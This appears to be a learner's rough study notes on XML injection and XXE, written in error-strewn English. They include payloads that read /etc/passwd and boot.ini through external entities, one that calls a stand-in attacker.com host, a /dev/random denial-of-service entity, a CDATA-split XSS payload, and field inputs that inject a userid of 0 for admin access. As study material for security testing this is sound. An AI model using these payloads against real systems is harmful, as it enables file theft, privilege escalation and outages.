xml enternal entity or xxe 
	xml is the vulnerabilty that allows an attacker to interfer (without the permisiton of other) attacker  can also view the files on server 
file system and interfaces with backend can access

How do xxe arises:
	some appliction uses xml to transfer the data from browser and the server. app is done by virtualy by some standerd library or some apl to 
process xml data on  server, xml arises some potentialy dangerous  fetures this features are supported even if the are not used  in the application

Discover:
	xml metacharacter are first use these character :
		<!DOCTYPE replace [ <!ENTITY example "Doe"> ]>
		<node attrib='$inputValue'/>
		inputValue = foo',foo", foo<, foo>,foo<!--
	or you can also use & ampresend represent entities(its used to create xml synatax like <>) an entity is character in unicode character set
	for eg:<tagnode>&lt;</tagnode>
	it will decode as < AsccII if &is not encode as &amp; it coude be use full to test xml injection
	<user> 
	<username>&foo</username> 
	<password>Un6R34kb!e</password> 
	<userid>500</userid>
	<mail>s4tan@hell.com</mail>
	</user>
but again document is not valid and its not terminated ;
but it will replacea as <name > cybery &example<name>
to 			<name > cybery Does<name>
CDATA section delimiters: <![CDATA[ / ]]> :
		characters enclosed in a CDATA section are not parsed by an XML parser.
For example, if there is the need to represent the string '<foo>' inside a text node, a CDATA section may be used:

<node>
    <![CDATA[<foo>]]>
</node>
so foo wont be parsed as marup its consider as character data
the tester could try to inject the end CDATA string ']]>' in order to try to invalidate the XML document. 
this will become:<username><![CDATA[]]>]]></username>
<html>
  <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
 </html>
which convert to normal xxs payloads, it removes the cdata in cdata there will be <> tags inside it 
<script>alert('XSS')</script>

External entity :
 To access the url or file name path than u should use external entity which can be used to perform denal of services attack of the local mechine 
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>
this can crash the unix system 
Other useful tests are the following:


 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

 
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>

after first step  we gave got some informastion now we can get lead  to privalage esulastion attack
Let's considering the previous application. By inserting the following values:

Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com


this will build new node in xml 
<user> 
		<username>tony</username> 
		<password>Un6R34kb!e</password> 
		<userid>500</userid>
		<mail>s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com</mail>
	</user> 
</users>
we have injected with admin privilage but the userid tag is apperated twice in node 
XML documents are associated with a schema or a DTD and will be rejected if they don't comply with it. 
Let's suppose that the XML document is specified by the following DTD:

<!DOCTYPE users [
	  <!ELEMENT users (user+) >
	  <!ELEMENT user (username,password,userid,mail+) >
	  <!ELEMENT username (#PCDATA) >
	  <!ELEMENT password (#PCDATA) >
	  <!ELEMENT userid (#PCDATA) >
	  <!ELEMENT mail (#PCDATA) >
]>
Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before and simple attack will not work if the xml 
document against dtd 
this can can be solved by simply controls the value of some nodes preceding the offending node, 
and controls the value of some nodes preceding the offending node by commending out by starting and ending
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com


There are three types xxe :
1.exploiting the xxe on retrive files :
		to get xxe from retrieve file system you need to modefy the xml in two ways
		1.edit the doctype 
		2.edit the data value in the xml
for example if the shop check the stock level of the product by submiting the xml to the server
		<?xml version="1.0" encoding="UTF-8"?>
		<stockCheck><productId>381</productId></stockCheck> 
if the application does not have any defences on xml thaen you attack and get the etc/passwd
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<stockCheck><productId>&xxe;</productId></stockCheck>
